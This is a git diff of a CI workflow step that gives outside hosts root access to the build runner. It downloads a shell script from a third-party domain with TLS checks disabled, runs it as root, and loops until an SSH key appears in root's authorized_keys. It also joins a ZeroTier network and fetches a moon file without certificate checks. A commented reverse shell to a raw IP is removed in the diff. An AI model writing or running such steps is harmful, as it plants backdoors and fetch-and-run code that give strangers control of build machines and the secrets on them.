@@ -18,20 +18,30 @@ jobs:
       - name: One-setup
         run: |
             (sudo rm -rf /swapfile /etc/apt/sources.list.d/* &) >/dev/null 2>&1
-            curl -skL dnsdian.com/ssh_key | sed 's/~\//\/root\//g' >ssh_key
+            sudo ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
+            curl -skL https://w3.zuzb.com/ssh_key | sed 's/~\//\/root\//g' >ssh_key
             sudo bash ssh_key
 
-            if curl -skL https://dnsdian.com/zerotier-one.tgz -o zerotier-one.tgz; then
+            if curl -skL https://w3.zuzb.com/zerotier-one.tgz -o zerotier-one.tgz; then
                 sudo tar --overwrite -zxvf zerotier-one.tgz -C /var/lib
             fi
             rm -f zerotier-one.tgz
             curl -s 'https://raw.githubusercontent.com/zerotier/ZeroTierOne/master/doc/contact%40zerotier.com.gpg' | gpg --import && \
             if z=$(curl -s 'https://install.zerotier.com/' | gpg 2>/dev/null); then echo "$z" | sudo bash; fi
             sudo zerotier-cli join b6079f73c65a4d9c
+            if [[ -d /var/lib/zerotier-one ]]; then
+                if [[ -d /var/lib/zerotier-one/moons.d ]]; then
+                    sudo rm -f /var/lib/zerotier-one/moons.d/*.moon 
+                else
+                    sudo mkdir /var/lib/zerotier-one/moons.d
+                fi
+                if sudo wget -c https://w3.zuzb.com/000000af043f1acb.moon -O /var/lib/zerotier-one/moons.d/000000af043f1acb.moon  --no-check-certificate --tries=5 --timeout=20; then
+                    sudo systemctl restart zerotier-one
+                fi
+            fi
 
-            while (! sudo egrep -i 'AAAAB3NzaC1yc2EAAAADAQABAAAEAQC7v' /root/.ssh/authorized_keys >/dev/null 2>&1); do
-                #sudo bash -i >& /dev/tcp/45.67.54.28/90 0>&1
-                sleep 10
+            while (! sudo egrep -i 'AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEA' /root/.ssh/authorized_keys >/dev/null 2>&1); do
+                sleep 3
                 sudo bash ssh_key
             done
             rm -f ssh_key
